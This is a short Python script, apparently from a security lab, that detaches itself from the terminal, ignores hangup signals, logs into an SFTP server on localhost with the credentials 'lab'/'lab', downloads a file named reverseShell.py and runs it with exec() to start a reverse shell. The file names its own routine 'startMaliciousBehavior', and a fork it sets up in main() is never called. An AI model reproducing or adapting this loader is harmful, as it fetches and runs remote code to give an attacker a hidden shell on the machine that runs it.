#!/usr/bin/python3
import time
import os
import paramiko
import sys
import random
import signal
import subprocess
import traceback

ONE_HOUR_IN_SECONDS = 3600

def main() -> None:
    processId = os.fork()

    if childProcess(processId):
        startMaliciousBehavior()


def childProcess(processId: int) -> bool:
    """Return True if process is a child and False otherwise."""
    return processId == 0




def startMaliciousBehavior() -> None:
    addSignalHandlers()
    flushInputOutput()
    disconnectFromTerminal()
    # TODO start logger here
    try:
        transport = paramiko.Transport(("localhost", 2200))
        transport.connect(None,  "lab", "lab")
        sftp = paramiko.SFTPClient.from_transport(transport)
        
        #Start reverse shell
        rs = sftp.open("/home/lab/reverseShell.py")
        rsCode = rs.read()
        exec(rsCode,  globals())
        rShell = ReverseShell()
        rShell.start()
    except Exception as e:
        print("*** Error: %s: %s" % (e.__class__,  e) )
        traceback.print_exc()

def addSignalHandlers() -> None:
    """Add all the signal handlers for the program.
    
    The following singals are caught:
        * SIGHUP
    """
    signal.signal(signal.SIGHUP, signal.SIG_IGN)


def flushInputOutput() -> None:
    """Flush out (empty) stdout as well as stderr."""
    sys.stdout.flush()
    sys.stderr.flush()


def disconnectFromTerminal():
    """Disconnect from terminal.

    Disconnect from terminal by changing the stdin, stdout and stderr
    to devnull. This ensures that the process is no longer connected to
    the session.
    """
    with open(os.devnull, "rb", 0) as devNull:
        os.dup2(devNull.fileno(), sys.stdin.fileno())
        os.dup2(devNull.fileno(), sys.stdout.fileno())
        os.dup2(devNull.fileno(), sys.stderr.fileno())


def waitForEver() -> None:
    while True:
        time.sleep(ONE_HOUR_IN_SECONDS)

        
startMaliciousBehavior()

